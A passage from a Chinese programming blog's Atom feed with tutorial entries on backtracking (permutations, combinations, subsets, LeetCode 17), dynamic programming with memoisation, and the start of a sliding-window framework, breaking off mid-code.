    <id>https://blog.zhengxiangling.com/2023/10/17/%E8%BF%90%E7%94%A8%E5%9B%9E%E6%BA%AF%E7%AE%97%E6%B3%95%EF%BC%8C%E8%A7%A3%E5%86%B3%E6%8E%92%E5%88%97%E3%80%81%E7%BB%84%E5%90%88%E5%92%8C%E5%AD%90%E9%9B%86%E9%97%AE%E9%A2%98/</id>
    <published>2023-10-17T10:43:00.000Z</published>
    <updated>2023-11-18T12:27:16.928Z</updated>
    
    <content type="html"><![CDATA[<p>回溯算法本质上也是一种暴力穷举算法，可以理解为：每个回溯问题就是遍历一个决策树的过程，每个叶子节点都存在一个数值，寻找叶子结点是否为满足条件的值，然后收集全部满足条件的值的过程就是<code>回溯算法</code>。</p><p>排列、组合和子集问题，无非就是寻找决策树叶子节点的过程，只是这三个问题对树枝的遍历和剪&#x2F;加树枝有稍微变化罢了，然后在区分一下三种边界条件：元素无重复不可复选、元素无重复可复选、元素可重复不可复选。</p><span id="more"></span><p><strong>回溯算法框架</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">result = []</span><br><span class="line">def <span class="title function_">backtrack</span><span class="params">(路径, 选择列表)</span>:</span><br><span class="line">    <span class="keyword">if</span> 满足结束条件:</span><br><span class="line">        result.add(路径)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> 选择 in 选择列表:</span><br><span class="line">        做选择</span><br><span class="line">        backtrack(路径, 选择列表)</span><br><span class="line">        撤销选择</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>形式一、元素无重不可复选，即 nums 中的元素都是唯一的，每个元素最多只能被使用一次，backtrack 核心代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 组合/子集问题回溯算法框架 */</span></span><br><span class="line"><span class="keyword">void</span> <span class="title function_">backtrack</span><span class="params">(<span class="type">int</span>[] nums, <span class="type">int</span> start)</span> &#123;</span><br><span class="line">    <span class="comment">// 回溯算法标准框架</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> start; i &lt; nums.length; i++) &#123;</span><br><span class="line">        <span class="comment">// 做选择</span></span><br><span class="line">        track.addLast(nums[i]);</span><br><span class="line">        <span class="comment">// 注意参数</span></span><br><span class="line">        backtrack(nums, i + <span class="number">1</span>);</span><br><span class="line">        <span class="comment">// 撤销选择</span></span><br><span class="line">        track.removeLast();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 排列问题回溯算法框架 */</span></span><br><span class="line"><span class="keyword">void</span> <span class="title function_">backtrack</span><span class="params">(<span class="type">int</span>[] nums)</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; nums.length; i++) &#123;</span><br><span class="line">        <span class="comment">// 剪枝逻辑</span></span><br><span class="line">        <span class="keyword">if</span> (used[i]) &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 做选择</span></span><br><span class="line">        used[i] = <span class="literal">true</span>;</span><br><span class="line">        track.addLast(nums[i]);</span><br><span class="line"></span><br><span class="line">        backtrack(nums);</span><br><span class="line">        <span class="comment">// 撤销选择</span></span><br><span class="line">        track.removeLast();</span><br><span class="line">        used[i] = <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>形式二、元素可重不可复选，即 nums 中的元素可以存在重复，每个元素最多只能被使用一次，其关键在于排序和剪枝，backtrack 核心代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">Arrays.sort(nums);</span><br><span class="line"><span class="comment">/* 组合/子集问题回溯算法框架 */</span></span><br><span class="line"><span class="keyword">void</span> <span class="title function_">backtrack</span><span class="params">(<span class="type">int</span>[] nums, <span class="type">int</span> start)</span> &#123;</span><br><span class="line">    <span class="comment">// 回溯算法标准框架</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> start; i &lt; nums.length; i++) &#123;</span><br><span class="line">        <span class="comment">// 剪枝逻辑，跳过值相同的相邻树枝</span></span><br><span class="line">        <span class="keyword">if</span> (i &gt; start &amp;&amp; nums[i] == nums[i - <span class="number">1</span>]) &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 做选择</span></span><br><span class="line">        track.addLast(nums[i]);</span><br><span class="line">        <span class="comment">// 注意参数</span></span><br><span class="line">        backtrack(nums, i + <span class="number">1</span>);</span><br><span class="line">        <span class="comment">// 撤销选择</span></span><br><span class="line">        track.removeLast();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Arrays.sort(nums);</span><br><span class="line"><span class="comment">/* 排列问题回溯算法框架 */</span></span><br><span class="line"><span class="keyword">void</span> <span class="title function_">backtrack</span><span class="params">(<span class="type">int</span>[] nums)</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; nums.length; i++) &#123;</span><br><span class="line">        <span class="comment">// 剪枝逻辑</span></span><br><span class="line">        <span class="keyword">if</span> (used[i]) &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 剪枝逻辑，固定相同的元素在排列中的相对位置</span></span><br><span class="line">        <span class="keyword">if</span> (i &gt; <span class="number">0</span> &amp;&amp; nums[i] == nums[i - <span class="number">1</span>] &amp;&amp; !used[i - <span class="number">1</span>]) &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 做选择</span></span><br><span class="line">        used[i] = <span class="literal">true</span>;</span><br><span class="line">        track.addLast(nums[i]);</span><br><span class="line"></span><br><span class="line">        backtrack(nums);</span><br><span class="line">        <span class="comment">// 撤销选择</span></span><br><span class="line">        track.removeLast();</span><br><span class="line">        used[i] = <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>形式三、元素无重可复选，即 nums 中的元素都是唯一的，每个元素可以被使用若干次，只要删掉去重逻辑即可，backtrack 核心代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 组合/子集问题回溯算法框架 */</span></span><br><span class="line"><span class="keyword">void</span> <span class="title function_">backtrack</span><span class="params">(<span class="type">int</span>[] nums, <span class="type">int</span> start)</span> &#123;</span><br><span class="line">    <span class="comment">// 回溯算法标准框架</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> start; i &lt; nums.length; i++) &#123;</span><br><span class="line">        <span class="comment">// 做选择</span></span><br><span class="line">        track.addLast(nums[i]);</span><br><span class="line">        <span class="comment">// 注意参数</span></span><br><span class="line">        backtrack(nums, i);</span><br><span class="line">        <span class="comment">// 撤销选择</span></span><br><span class="line">        track.removeLast();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 排列问题回溯算法框架 */</span></span><br><span class="line"><span class="keyword">void</span> <span class="title function_">backtrack</span><span class="params">(<span class="type">int</span>[] nums)</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; nums.length; i++) &#123;</span><br><span class="line">        <span class="comment">// 做选择</span></span><br><span class="line">        track.addLast(nums[i]);</span><br><span class="line">        backtrack(nums);</span><br><span class="line">        <span class="comment">// 撤销选择</span></span><br><span class="line">        track.removeLast();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="17-电话号码的字母组合"><a href="#17-电话号码的字母组合" class="headerlink" title="17.电话号码的字母组合"></a>17.电话号码的字母组合</h5><blockquote><p>Problem: <a href="https://leetcode.cn/problems/letter-combinations-of-a-phone-number/description/">17. 电话号码的字母组合</a></p></blockquote><div class="elfjS" data-track-load="description_content"><p>给定一个仅包含数字&nbsp;<code>2-9</code>&nbsp;的字符串，返回所有它能表示的字母组合。答案可以按 <strong>任意顺序</strong> 返回。</p><p>给出数字到字母的映射如下（与电话按键相同）。注意 1 不对应任何字母。</p><p><img src="https://assets.leetcode-cn.com/aliyun-lc-upload/uploads/2021/11/09/200px-telephone-keypad2svg.png" class="lazyload" data-srcset="https://assets.leetcode-cn.com/aliyun-lc-upload/uploads/2021/11/09/200px-telephone-keypad2svg.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" style="width: 200px;"></p><p><strong>示例 1：</strong></p><pre><strong>输入：</strong>digits = "23"<strong>输出：</strong>["ad","ae","af","bd","be","bf","cd","ce","cf"]</pre><p><strong>示例 2：</strong></p><pre><strong>输入：</strong>digits = ""<strong>输出：</strong>[]</pre><p><strong>示例 3：</strong></p><pre><strong>输入：</strong>digits = "2"<strong>输出：</strong>["a","b","c"]</pre><p><strong>提示：</strong></p><ul>    <li><code>0 &lt;= digits.length &lt;= 4</code></li>    <li><code>digits[i]</code> 是范围 <code>['2', '9']</code> 的一个数字。</li></ul></div><ol><li><p>思路</p><blockquote><p>按题目，按键无重复值，并且是从头往后组合不可复选，可直接上回溯算法。</p></blockquote></li><li><p>解题方法</p><blockquote><p>把按钮的值存入数组，然后递归。</p></blockquote></li><li><p>Code</p></li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    List&lt;String&gt; ans = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">    <span class="type">int</span> n;</span><br><span class="line">    String phone;</span><br><span class="line">    <span class="keyword">public</span> List&lt;String&gt; <span class="title function_">letterCombinations</span><span class="params">(String digits)</span> &#123;</span><br><span class="line">        String[] s = <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;abc&quot;</span>,<span class="string">&quot;def&quot;</span>,<span class="string">&quot;ghi&quot;</span>,<span class="string">&quot;jkl&quot;</span>,<span class="string">&quot;mno&quot;</span>,<span class="string">&quot;pqrs&quot;</span>,<span class="string">&quot;tuv&quot;</span>,<span class="string">&quot;wxyz&quot;</span>&#125;;</span><br><span class="line">        <span class="type">String</span> <span class="variable">track</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        n = digits.length();</span><br><span class="line">        <span class="keyword">if</span> (n == <span class="number">0</span>) <span class="keyword">return</span> ans;</span><br><span class="line">        phone = digits;</span><br><span class="line">        <span class="comment">// boolean[] used = new boolean[n];</span></span><br><span class="line">        backtracks(s, track, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">backtracks</span><span class="params">(String[] s, String track, <span class="type">int</span> start)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (track.length() == n) &#123;</span><br><span class="line">            ans.add(track);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// for(int i = start; i &lt; n; i++) &#123;</span></span><br><span class="line">            <span class="comment">// if(used[i]) continue;</span></span><br><span class="line">            <span class="keyword">for</span>(<span class="type">char</span> c: s[phone.charAt(start) - <span class="string">&#x27;2&#x27;</span>].toCharArray()) &#123;</span><br><span class="line">                track += c;</span><br><span class="line">                <span class="comment">// used[i] = true;</span></span><br><span class="line">                backtracks(s, track, start + <span class="number">1</span>);</span><br><span class="line">                track = track.substring(<span class="number">0</span>, track.length() - <span class="number">1</span>);</span><br><span class="line">                <span class="comment">// used[i] = false;</span></span><br><span class="line">            &#125;</span><br><span class="line">        <span class="comment">// &#125;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;回溯算法本质上也是一种暴力穷举算法，可以理解为：每个回溯问题就是遍历一个决策树的过程，每个叶子节点都存在一个数值，寻找叶子结点是否为满足条件的值，然后收集全部满足条件的值的过程就是&lt;code&gt;回溯算法&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;排列、组合和子集问题，无非就是寻找决策树叶子节点的过程，只是这三个问题对树枝的遍历和剪&amp;#x2F;加树枝有稍微变化罢了，然后在区分一下三种边界条件：元素无重复不可复选、元素无重复可复选、元素可重复不可复选。&lt;/p&gt;</summary>
    
    
    
    <category term="计算机算法" scheme="https://blog.zhengxiangling.com/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%AE%97%E6%B3%95/"/>
    
    <category term="回溯算法" scheme="https://blog.zhengxiangling.com/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%AE%97%E6%B3%95/%E5%9B%9E%E6%BA%AF%E7%AE%97%E6%B3%95/"/>
    
    
    <category term="回溯算法" scheme="https://blog.zhengxiangling.com/tags/%E5%9B%9E%E6%BA%AF%E7%AE%97%E6%B3%95/"/>
    
  </entry>
  
  <entry>
    <title>动态规划求最值问题</title>
    <link href="https://blog.zhengxiangling.com/2023/10/16/%E8%A7%84%E5%88%92%E6%B1%82%E6%9C%80%E5%80%BC%E9%97%AE%E9%A2%98/"/>
    <id>https://blog.zhengxiangling.com/2023/10/16/%E8%A7%84%E5%88%92%E6%B1%82%E6%9C%80%E5%80%BC%E9%97%AE%E9%A2%98/</id>
    <published>2023-10-16T11:18:00.000Z</published>
    <updated>2023-11-17T14:27:30.011Z</updated>
    
    <content type="html"><![CDATA[<p>求最值问题，比如最长序列、最短距离等，不考虑时间和空间都可以通过暴力穷举的方式遍历获得结果，通过对穷举的过程进行优化减少重复开销的过程，即动态规划。</p><p>动态规划的重点，就是如何确定 <code>状态转移方程</code> 和 通过 <code>备忘录</code> 空间换时间降低时间复杂度（优化穷举）。</p><span id="more"></span><p>以拿硬币举例，从 <code>1,2,5</code> 从拿硬币，求 <code>amount</code> 满足 <code>11</code> 时的最少硬币数量。</p><h5 id="状态转移方程构建"><a href="#状态转移方程构建" class="headerlink" title="状态转移方程构建"></a>状态转移方程构建</h5><p><strong>1.确定 base case</strong><br>即确定满足什么边界条件时 <code>return</code> 直接结束当前递归。<br>其中，例子的边界条件为：当 <code>amount == 0</code> 时 返回 <code>0</code>，当 <code>amount &lt; 0</code> 时无解，返回 <code>-1</code>。 </p><p><strong>2.确定 状态</strong><br>即原问题和子问题都会变化的变量。<br>其中，例子的状态为 <code>amount</code>，可以看出每拿走一个硬币 <code>amount</code> 就会改变，并向 <code>base case</code> 靠近，直至匹配。</p><p><strong>3.明确 选择</strong><br>即导致状态改变的行为。<br>其中，例子的选择为拿硬币。</p><p><strong>4.明确 dp 的定义</strong><br><code>dp</code> 函数即递归找最值的函数，递归一般分为 自顶向下 和 自底向上 两种，框架如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"># 自顶向下递归的动态规划</span><br><span class="line">def <span class="title function_">dp</span><span class="params">(状态<span class="number">1</span>, 状态<span class="number">2</span>, ...)</span>:</span><br><span class="line">    <span class="keyword">for</span> 选择 in 所有可能的选择:</span><br><span class="line">        # 此时的状态已经因为做了选择而改变</span><br><span class="line">        result = 求最值(result, dp(状态<span class="number">1</span>, 状态<span class="number">2</span>, ...))</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"># 自底向上迭代的动态规划</span><br><span class="line"># 初始化 base <span class="keyword">case</span></span><br><span class="line">dp[<span class="number">0</span>][<span class="number">0</span>][...] = base <span class="keyword">case</span></span><br><span class="line"># 进行状态转移</span><br><span class="line"><span class="keyword">for</span> 状态<span class="number">1</span> in 状态<span class="number">1</span>的所有取值：</span><br><span class="line">    <span class="keyword">for</span> 状态<span class="number">2</span> in 状态<span class="number">2</span>的所有取值：</span><br><span class="line">        <span class="keyword">for</span> ...</span><br><span class="line">            dp[状态<span class="number">1</span>][状态<span class="number">2</span>][...] = 求最值(选择<span class="number">1</span>，选择<span class="number">2.</span>..)</span><br></pre></td></tr></table></figure><p>对比如下解法看出区别：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 自顶向下</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">fib</span><span class="params">(<span class="type">int</span> N)</span> &#123;</span><br><span class="line">    <span class="comment">// 备忘录全初始化为 0</span></span><br><span class="line">    <span class="type">int</span>[] memo = <span class="keyword">new</span> <span class="title class_">int</span>[N + <span class="number">1</span>];</span><br><span class="line">    <span class="comment">// 进行带备忘录的递归</span></span><br><span class="line">    <span class="keyword">return</span> dp(memo, N);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 带着备忘录进行递归</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">dp</span><span class="params">(<span class="type">int</span>[] memo, <span class="type">int</span> n)</span> &#123;</span><br><span class="line">    <span class="comment">// base case</span></span><br><span class="line">    <span class="keyword">if</span> (n == <span class="number">0</span> || n == <span class="number">1</span>) <span class="keyword">return</span> n;</span><br><span class="line">    <span class="comment">// 已经计算过，不用再计算了</span></span><br><span class="line">    <span class="keyword">if</span> (memo[n] != <span class="number">0</span>) <span class="keyword">return</span> memo[n];</span><br><span class="line">    memo[n] = dp(memo, n - <span class="number">1</span>) + dp(memo, n - <span class="number">2</span>);</span><br><span class="line">    <span class="keyword">return</span> memo[n];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 自底向上</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">fib</span><span class="params">(<span class="type">int</span> N)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (N == <span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span>[] dp = <span class="keyword">new</span> <span class="title class_">int</span>[N + <span class="number">1</span>];</span><br><span class="line">    <span class="comment">// base case</span></span><br><span class="line">    dp[<span class="number">0</span>] = <span class="number">0</span>; dp[<span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line">    <span class="comment">// 状态转移</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">2</span>; i &lt;= N; i++) &#123;</span><br><span class="line">        dp[i] = dp[i - <span class="number">1</span>] + dp[i - <span class="number">2</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> dp[N];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="备忘录-memo"><a href="#备忘录-memo" class="headerlink" title="备忘录 memo"></a>备忘录 memo</h5><p>备忘录的作用，用于解决重复计算的问题。每次解决子问题的时候，先去备忘录查一下是否有结果，如果有直接使用，避免重复计算。例子如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">fib</span><span class="params">(<span class="type">int</span> N)</span> &#123;</span><br><span class="line">    <span class="comment">// 备忘录全初始化为 0</span></span><br><span class="line">    <span class="type">int</span>[] memo = <span class="keyword">new</span> <span class="title class_">int</span>[N + <span class="number">1</span>];</span><br><span class="line">    <span class="comment">// 进行带备忘录的递归</span></span><br><span class="line">    <span class="keyword">return</span> dp(memo, N);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 带着备忘录进行递归</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">dp</span><span class="params">(<span class="type">int</span>[] memo, <span class="type">int</span> n)</span> &#123;</span><br><span class="line">    <span class="comment">// base case</span></span><br><span class="line">    <span class="keyword">if</span> (n == <span class="number">0</span> || n == <span class="number">1</span>) <span class="keyword">return</span> n;</span><br><span class="line">    <span class="comment">// 已经计算过，不用再计算了</span></span><br><span class="line">    <span class="keyword">if</span> (memo[n] != <span class="number">0</span>) <span class="keyword">return</span> memo[n];</span><br><span class="line">    memo[n] = dp(memo, n - <span class="number">1</span>) + dp(memo, n - <span class="number">2</span>);</span><br><span class="line">    <span class="keyword">return</span> memo[n];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;求最值问题，比如最长序列、最短距离等，不考虑时间和空间都可以通过暴力穷举的方式遍历获得结果，通过对穷举的过程进行优化减少重复开销的过程，即动态规划。&lt;/p&gt;
&lt;p&gt;动态规划的重点，就是如何确定 &lt;code&gt;状态转移方程&lt;/code&gt; 和 通过 &lt;code&gt;备忘录&lt;/code&gt; 空间换时间降低时间复杂度（优化穷举）。&lt;/p&gt;</summary>
    
    
    
    <category term="动态规划" scheme="https://blog.zhengxiangling.com/categories/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/"/>
    
    
  </entry>
  
  <entry>
    <title>滑动窗口找满足规则的区间问题</title>
    <link href="https://blog.zhengxiangling.com/2023/10/16/%E5%8F%8C%E6%8C%87%E9%92%88%E7%A7%92%E6%9D%80%E6%95%B0%E7%BB%84%E3%80%81%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%93%8D%E4%BD%9C%E9%A2%98/"/>
    <id>https://blog.zhengxiangling.com/2023/10/16/%E5%8F%8C%E6%8C%87%E9%92%88%E7%A7%92%E6%9D%80%E6%95%B0%E7%BB%84%E3%80%81%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%93%8D%E4%BD%9C%E9%A2%98/</id>
    <published>2023-10-16T00:12:00.000Z</published>
    <updated>2023-11-18T12:41:09.592Z</updated>
    
    <content type="html"><![CDATA[<p>滑动窗口也为快慢指针。两个指针，<code>fast</code>指针在前面探路，<code>slow</code>指针负责在移动前做判断条件，然后再移动，两个指针覆盖的长度即为要找的元素空间。</p><p>常见的快慢指针题目：找满足条件的最长子串、删除排序的重复元素等。</p><span id="more"></span><h5 id="滑动窗口算法框架"><a href="#滑动窗口算法框架" class="headerlink" title="滑动窗口算法框架"></a>滑动窗口算法框架</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 滑动窗口算法框架 */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">slidingWindow</span><span class="params">(String s, String t)</span> &#123;</span><br><span class="line">    HashMap&lt;Character, Integer&gt; need = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">    HashMap&lt;Character, Integer&gt; window = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">char</span> c : t.toCharArray()) need.put(c, need.getOrDefault(c, <span class="number">0</span>) + <span class="number">1</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="type">int</span> <span class="variable">left</span> <span class="operator">=</span> <span class="number">0</span>, right = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> <span class="variable">valid</span> <span class="operator">=</span> <span class="number">0</span>; </span><br><span class="line">    <span class="keyword">while</span> (right &lt; s.length()) &#123;</span><br><span class="line">        <span class="type">char</span> <span class="variable">c</span> <span class="operator">=</span> s.charAt(right);</span><br><span class="line">        <span class="comment">// 右移（增大）窗口</span></span><br><span class="line">        right++;</span><br><span class="line">        <span class="comment">// 进行窗口内数据的一系列更新</span></span><br><span class="line">        <span class="keyword">if</span> (need.containsKey(c)) &#123;</span><br><span class="line">            window.put(c, window.getOrDefault(c, <span class="number">0</span>) + <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">if</span> (window.get(c).equals(need.get(c))) valid++;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (window needs shrink) &#123;</span><br><span class="line">            <span class="type">char</span> <span class="variable">d</span> <span class="operator">=</span> s.charAt(left);</span><br><span class="line">            <span class="comment">// 左移（缩小）窗口</span></span><br><span class="line">            left++;</span><br><span class="line">            <span class="comment">// 进行窗口内数据的一系列更新</span></span><br><span class="line">            <span class="keyword">if</span> (need.containsKey(d)) &#123;</span><br><span class="line">                <span class="keyword">if</span> (window.get(d).equals(need.get(d))) valid--;</span><br><span class="line">                window.put(d, window.getOrDefault(d, <span class="number">0</span>) - <span 